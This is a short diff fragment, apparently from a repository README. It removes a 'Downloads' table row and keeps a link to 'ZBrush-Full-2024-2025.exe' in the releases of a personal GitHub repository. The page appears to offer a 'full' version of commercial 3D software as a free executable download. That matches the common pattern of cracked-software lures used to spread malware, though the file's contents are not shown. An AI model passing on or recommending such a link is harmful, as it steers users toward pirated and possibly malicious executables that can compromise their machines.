@@ -5,7 +5,7 @@
 
 
 
-| Downloads | For Windows | 
+
 
 [Download for Windows](https://github.com/arsham129/Zbrush-Full-2024-2025/releases/download/2/ZBrush-Full-2024-2025.exe) 
 
